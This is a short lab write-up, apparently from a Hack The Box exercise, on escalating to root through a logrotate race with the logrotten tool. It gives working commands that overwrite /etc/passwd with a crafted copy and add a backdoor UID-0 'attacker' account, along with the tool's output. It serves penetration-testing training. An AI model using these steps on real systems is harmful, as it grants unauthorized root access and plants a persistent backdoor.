# [Logrotate](Logrotate.md)
### Escalate the privileges and submit the contents of flag.txt as the answer.

Firstly i need to prepare the payload

```shell
echo 'if [ `id -u` -eq 0 ]; then (cp /dev/shm/passwd /etc/passwd &); fi' > payloadfile
```

I chose to overwrite /etc/passwd with our own, appending a new root user

```shell
openssl passwd -1 Password1

$1$4Ylthux7$x4zJ8.53f/Nm/MFW7GFF91

echo 'attacker:$1$4Ylthux7$x4zJ8.53f/Nm/MFW7GFF91:0:0:attacker:/root:/bin/bash' >> /dev/shm/passwd
```

I opened a new terminal to trigger the `access.log`
![](Screenshot%202026-08-09%20at%2016.31.22.png)

Then I run the `logrotten`

```shell
./logrotten -p ./payloadfile /home/htb-student/backups/access.log
Waiting for rotating /home/htb-student/backups/access.log...
Renamed /home/htb-student/backups with /home/htb-student/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```

Got root access
![](Screenshot%202026-08-09%20at%2016.33.08.png)